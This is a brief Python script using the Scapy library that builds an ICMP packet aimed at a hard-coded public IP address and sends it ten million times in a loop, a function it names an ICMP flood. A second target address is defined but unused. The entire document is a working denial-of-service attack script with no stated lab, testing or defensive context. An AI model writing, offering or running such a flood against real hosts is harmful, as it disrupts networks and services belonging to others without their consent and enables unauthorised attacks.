from scapy.all import *

target_ip = "154.251.94.154"
target_ip2 = "105.106.96.234"


packet = IP(dst=target_ip2)/ICMP()

def send_icmp_flood(packet, count=10000000):
    for _ in range(count):
        send(packet)

send_icmp_flood(packet)
